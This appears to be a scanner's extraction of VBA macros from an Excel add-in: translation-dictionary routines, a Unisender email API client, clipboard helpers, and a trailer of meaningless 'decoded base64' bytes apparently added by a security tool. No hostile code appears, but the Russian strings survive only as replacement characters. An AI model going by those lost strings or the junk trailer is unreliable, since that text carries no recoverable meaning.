Private Sub loadInfo_UserForms()
    On Error Resume Next
    DoNotTranslate = True

    'PrintWords F_UsageExample
    PrintWords F_Settings

    ' PrintWords F_FirstRun
    DoNotTranslate = False
End Sub

Private Sub PrintUserformNames()
    On Error Resume Next
    Dim VBComp As Object
    For Each VBComp In ThisWorkbook.VBProject.VBComponents
        If VBComp.Type = 3 Then Debug.Print VBComp.Name
    Next VBComp
End Sub

Sub PrintWords(ByRef UF As Object)
    On Error Resume Next
    shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(2) = UF.Name & " controls"
    Dim ctrl As MSForms.Control
    For Each ctrl In UF.Controls
        AddControlInformation ctrl, UF.Name
    Next
End Sub

Sub AddControlInformation(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim cell As Range, m_page As Object, id$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            AddControlInformation m_page, ParentName$ & "\" & ctrl.Name
        Next
    Else
        id$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
        Debug.Print id$
        If Len(ctrl.Caption) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            cell.Resize(, 2).value = Array(id$, ctrl.Caption)
        End If

        If Len(ctrl.Tag) Then
            If ctrl.Tag <> "ScrollCombo" Then
                Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
                id$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
                cell.Resize(, 2).value = Array(id$, ctrl.Tag)
            End If
        End If

        If Len(ctrl.ControlTipText) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            id$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            cell.Resize(, 2).value = Array(id$, ctrl.ControlTipText)
        End If
    End If
End Sub

Function SYSTEM_LANGUAGE() As String
    On Error Resume Next
    Select Case Application.LanguageSettings.LanguageID(msoLanguageIDUI)
        Case 1049: SYSTEM_LANGUAGE = "ru"
        Case Else: SYSTEM_LANGUAGE = DEFAULT_LANGUAGE
    End Select
End Function

Function SetLanguage(ByVal new_lang_code$) As Boolean
    ' returns TRUE if language was changed (interface needs to be translated)
    On Error Resume Next
    Dim prev_lang_code$: prev_lang_code$ = GetLanguage
    SETT.SetText "Language", new_lang_code$, "Setup"

    SetLanguage = LCase(prev_lang_code$) <> LCase(new_lang_code$)
    If SetLanguage Then PrepareTraslateDictionary        ': CreateProgramCommandBar
End Function

Function GetLanguage() As String
    GetLanguage = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE)
End Function

Function RUS() As Boolean
    RUS = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE) = "ru"
End Function

Function tt(ByVal id$, ParamArray tokens()) As String
    On Error Resume Next: Dim i&, AddSpaces As Boolean
    If id$ Like "|??*" Then id$ = SETT.U(Mid(id$, 2))
    If id$ Like " ?*" Then id$ = Mid(id$, 2): AddSpaces = True
    tt = TR_DIC.item(id$)
    If Not IsMissing(tokens) Then
        For i = LBound(tokens) To UBound(tokens)
            tt = Replace(tt, "!" & (i + 1), tokens(i))
        Next i
    End If
    tt = Replace(tt, "!add-in", PROJECT_NAME$)
    tt = Replace(tt, "/n", vbNewLine)
    If AddSpaces Then tt = " " & tt & " "
End Function

Function PrepareTraslateDictionary()
    On Error Resume Next: Err.Clear
    Dim ra As Range, KEYarr As Variant, VALarr As Variant, AvLangArr As Variant, col&, lang_code$, i&, k, v$
    Set ra = shtr.Range(shtr.Cells(TRANSLATE_SHEET_FIRST_ROW, 1), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    If ra.Row < TRANSLATE_SHEET_FIRST_ROW Then
        MsgBox "Translation sheet has no data", vbCritical, "Contact the developer"
        End
    End If

    lang_code$ = GetLanguage: AvLangArr = AvailableLanguagesArray(True)
    For i = LBound(AvLangArr) To UBound(AvLangArr)
        If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
    Next i

    If col& = 0 Then
        lang_code$ = DEFAULT_LANGUAGE
        For i = LBound(AvLangArr) To UBound(AvLangArr)
            If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
        Next i
    End If

    If col& = 0 Then
        MsgBox "Translation error: unsupported language |fffd|" & GetLanguage & "|fffd|", vbCritical, "Contact the developer"
        End
    End If

    KEYarr = ra.value
    VALarr = ra.Offset(, col&).value

    With TR_DIC
        .RemoveAll
        .CompareMode = TextCompare
        For i = LBound(KEYarr) To UBound(KEYarr)
            v$ = VALarr(i, 1)
            For Each k In Split(KEYarr(i, 1), "|")
                If Len(k) Then If Not .Exists(CStr(k)) Then .item(CStr(k)) = v$
            Next k
        Next i
    End With
End Function

Function AvailableLanguagesArray(Optional FullList As Boolean = False) As Variant
    On Error Resume Next: Err.Clear
    Dim ra As Range, arr, res, i&, ii&, dic As New Dictionary, ind&, CurrLangPresentInList As Boolean, CurrLanguage$, CurrLanguageColumn&
    Set ra = shtr.Range(shtr.[b1], shtr.Range("z1").End(xlToLeft)).Resize(4)
    If Err Then
        MsgBox "Translation sheet is absent", vbCritical, "Contact the developer"
        End
    End If
    If ra.Column < 2 Then
        MsgBox "Translation sheet is blank", vbCritical, "Contact the developer"
        End
    End If

    If FullList Then
        AvailableLanguagesArray = Application.Transpose(ra.value)
        Exit Function
    End If

    arr = ra.value
    ind& = 0: dic.CompareMode = TextCompare: CurrLanguage$ = GetLanguage
    For ii = LBound(arr, 2) To UBound(arr, 2)
        If arr(1, ii) = CurrLanguage$ Then CurrLanguageColumn& = ii
        For i = LBound(arr, 2) To UBound(arr, 2)
            If Val(arr(4, i)) = ii Then
                ind& = ind& + 1: dic.item(ind&) = i
                If arr(1, i) = CurrLanguage$ Then CurrLangPresentInList = True
            End If
        Next i
    Next ii
    If Not CurrLangPresentInList Then If CurrLanguageColumn& Then dic.item(ind& + 1) = CurrLanguageColumn&

    If ind& = 0 Then
        MsgBox "Translation sheet error: can't find language indexes", vbCritical, "Contact the developer"
        End
    End If

    ReDim res(1 To dic.Count, 1 To 2)
    For i = LBound(res) To UBound(res)
        res(i, 1) = arr(1, dic.item(i))
        res(i, 2) = arr(2, dic.item(i))
    Next i

    AvailableLanguagesArray = res
    Set dic = Nothing
End Function

Sub OneMoreSettingsForm()
    SetLanguage "en"
    With New F_Settings
        .Show
    End With
End Sub

Sub TranslateWorkbook(ByRef WB As Workbook)
    On Error Resume Next:    Dim n As Name, txt$
    For Each n In WB.Names
        'Debug.Print n.Name & vbTab & n.RefersToRange.Value
        txt$ = tt(n.Name)
        If Len(txt) Then n.RefersToRange.Cells(1).value = txt
    Next
End Sub

'Function TranslateHyperlink(ByVal URL$, Optional ByVal ForTip As Boolean = False) As String
'    On Error Resume Next
'    TranslateHyperlink = URL$
'    LangCode$ = GetLanguageCode$
'    If LangCode$ = "ru" Or LangCode$ = "" Then Exit Function
'    ' If ForTip Then TranslateHyperlink = "Translation of " & URL$: Exit Function
'    If ForTip Then TranslateHyperlink = "(Russian -> " & GetLanguage$ & ") " & URL$: Exit Function
'    TranslateHyperlink = "http://translate.google.com/translate?sl=ru&tl=" & LangCode$ & "&u=" & URLEncode(URL$)
'End Function


Attribute VB_Name = "mod_Unisender"
'---------------------------------------------------------------------------------------
' Module        : mod_Unisender                    Version:
' Author        : Igor Vakhnenko                   Date: 09.06.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module

Private Sub test_unisender()
    URL$ = "https://api.unisender.com/ru/api/getLists"
    Dim res As Dictionary, coll As Collection
    Set res = UnisenderRequest(URL)

    If res.Exists("result") Then
        Debug.Print "ok"
        Set coll = res.item("result")
        For Each v In coll
            Debug.Print TypeName(v)
        Next

    Else
        Debug.Print "error"
        Debug.Print "error name" & res.item("error")
        Debug.Print "error code" & res.item("code")
    End If

    '    For Each v In res.Items
    '        Debug.Print TypeName(v)
    '    Next
End Sub

Private Sub TEST_Unisender_getLists()
    On Error Resume Next
    res = Unisender_getLists
    If IsArray(res) Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & UBound(res), vbInformation, "ok"
    Else
        MsgBox res, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Function Unisender_getLists(Optional ByVal api_key$) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Unisender_getLists = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"

    URL$ = "https://api.unisender.com/ru/api/getLists"
    Dim res As Dictionary, coll As Collection, i&, v As Dictionary, add_list As Dictionary

Label_GetUnisenderList:
    Set res = UnisenderRequest(URL, , api_key$)
    If res.Exists("result") Then
        'Debug.Print "ok"
        Set coll = res.item("result")

        If coll.Count = 0 Then
            'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
            Set add_list = UnisenderRequest("https://api.unisender.com/ru/api/createList", "title=FillDocuments", api_key$)
            If add_list.Exists("result") Then
                GoTo Label_GetUnisenderList    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Else
                Unisender_getLists = "error " & add_list.item("code") & ": " & add_list.item("error")
                Exit Function
            End If
        End If

        ReDim arr(1 To coll.Count)
        For i = 1 To coll.Count
            Set v = coll(i)
            arr(i) = v.item("id") & "=" & v.item("title")
        Next
        Unisender_getLists = arr
    Else
        Unisender_getLists = "error " & res.item("code") & ": " & res.item("error")
    End If
End Function

Function UnisenderRequest(URL$, Optional PostData$, Optional ByVal api_key$) As Object
    On Error Resume Next
    Dim HTTP As WinHttpRequest, StaticPostData$, POST() As Byte, i&, Response$
    Set HTTP = New WinHttpRequest
    ' https://www.unisender.com/ru/support/integration/api
    ' https://support.unisender.com/index.php?/Knowledgebase/Article/View/69/0/sendemail---uproshhjonnja-otprvk-individulnykh-email-soobshhenijj&_ga=1.127073677.1479843546.1474516806

    If api_key$ = "" Then api_key$ = Trim(SETT.GetText("TextBox_EmailAPI_APIkey"))
    StaticPostData$ = "format=json&api_key=" & URL_Encode2(api_key$)

    With HTTP
        .Open "POST", URL$, True
        .setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        POST = StrConv(StaticPostData$ & "&" & PostData, vbFromUnicode)
        .Send (POST): DoEvents

        If .WaitForResponse(4) Then
            Response$ = .ResponseText
            ' Debug.Print Response$

            Dim JSON As New cJSONparser, res As Object
            Set res = JSON.Parse(.ResponseText)
            If Not IsObject(res) Then
                Debug.Print JSON.GetParserErrors
            Else
                Err.Clear
                'Set UnisenderRequest = res.item("result")
                Set UnisenderRequest = res
            End If
            'txt$ = JSON.ToXML(txt$)
            Set JSON = Nothing

            '            arr(n, 4) = Split(Split(Response$, """id"":""")(1), """")(0)
            '            arr(n, 5) = Split(Split(Response$, """code"":""")(1), """")(0)
            '            arr(n, 6) = Split(Split(Response$, """errors"":[")(1), "]")(0)
            '            arr(n, 3) = IIf(arr(n, 5) = "", "", "|fffd||fffd| ") & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Else
            Debug.Print "timeout (4 sec)  " & URL$
        End If
    End With

    Set HTTP = Nothing
End Function
Attribute VB_Name = "sh1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Attribute VB_Name = "shtr"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 08.01.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Const PREFIX$ = "MENU"

Function NewTranslateID() As String
    On Error Resume Next
    Dim ra As Range, coll As New Collection
    Set ra = shtr.Range(shtr.Range("a" & TRANSLATE_SHEET_FIRST_ROW), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    arr = ra.value
    For i = LBound(arr) To UBound(arr)
        coll.Add arr(i, 1), CStr(arr(i, 1))
    Next i

    For i = 1 To 1000
        Err.Clear: id$ = PREFIX$ & "_" & Format(i, "0000")
        coll.Add id$, id$
        If Err = 0 Then NewTranslateID = id$: Exit Function
    Next
    MsgBox "Can't create ID$", vbExclamation, "Function NewTranslateID()"
End Function

Function clipBoardText()
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        clipBoardText = .GetText
    End With
End Function

Sub SetClipboardText(ByVal txt$)
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText txt$
        .PutInClipboard
    End With
End Sub

Private Sub Worksheet_BeforeDoubleClick(ByVal Target As Range, Cancel As Boolean)
    On Error Resume Next
    If Target.Column = 1 And Target.Cells.Count = 1 Then
        If Target <> "" Then Cancel = True: SetClipboardText "tt(""" & Target & """) "
    End If
End Sub


' InQuest injected base64 decoded content
' jZ 	
' "{-jYT
' ^O*^
' *'~*
' "{-jYKj
' x)br
' x)brC
' xL\z
' *'jSn
' -xZ+
' z{Li
' *'.+-

INQUEST-PP=macro
